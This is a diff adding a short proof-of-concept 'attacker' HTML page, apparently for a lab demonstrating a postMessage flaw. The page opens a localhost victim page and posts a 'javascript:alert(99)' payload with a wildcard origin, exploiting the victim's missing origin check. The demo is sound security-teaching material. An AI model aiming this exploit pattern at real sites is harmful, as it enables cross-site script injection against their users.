@@ -1,0 +1,27 @@
+<!-- attacker.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Attacker Page</title>
+  <style>
+    body { font-family: Arial; background-color: #fff3f3; padding: 20px; }
+  </style>
+</head>
+<body>
+  <h2>Malicious Site</h2>
+  <p>Click below to exploit the vulnerable site.</p>
+  <button onclick="steal()">Exploit Now</button>
+
+  <script>
+    function steal() {
+      const target = window.open("http://localhost:8000/vulnerable_site.html", "victimWindow");
+
+      // Wait for victim page to load
+      setTimeout(() => {
+        target.postMessage("javascript:alert(99)", "*"); // BAD: no origin check in victim
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
+
